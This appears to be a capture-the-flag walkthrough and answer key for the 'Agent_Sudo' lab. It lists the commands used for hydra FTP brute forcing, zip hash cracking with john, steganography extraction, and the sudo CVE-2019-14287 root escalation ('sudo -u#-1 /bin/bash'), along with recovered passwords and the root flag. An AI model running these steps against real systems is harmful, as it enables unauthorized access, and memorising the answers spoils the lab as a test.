# Machine Name : Agent_Sudo
# Machine IP : 110.10.167.223

***TASK1***
```
Deploy
```

***TASK2***
```
1.How many open ports?
: 3

2.How you redirect yourself to a secret page?
: user-agent

3.What is the agent name?
: curl "{ip}" -H "user-agent:c" -L
```

***TASK3***
1.FTP Password
```
: hydra -l chris -P commmon_password_list.txt 10.10.79.0 ftp
```

2.Zip file password
```
: strings cutie.png
: binwalk -e cutie.png
: zip2john 8702.zip > hashes_for_john.txt
: john hashes_for_jhon.txt --worlist={password file path}
```
-> alien

3.steg password
```
: 7z e 8702.zip
: cat To_agentR.txt
: echo  base64msg | base64 -d
-> Area51
```

4.Who is the other agent (in full name)?
```
: steghide extract -sf cute-alien.jpg
-> james
```

5.ssh password
```
:hackerrules!
```
***TASK4: Capture the user flag***


***TASK5: Privilege Escalation***
```
#1 CVE number for the escalation : cve-2019-14287
-> sudo -u#-1 /bin/bash

#2 What is the root flag : 53a02f55b57d4439e3341834d70c062

#3 (Bonus) Who is Agent R? : DesKel

```
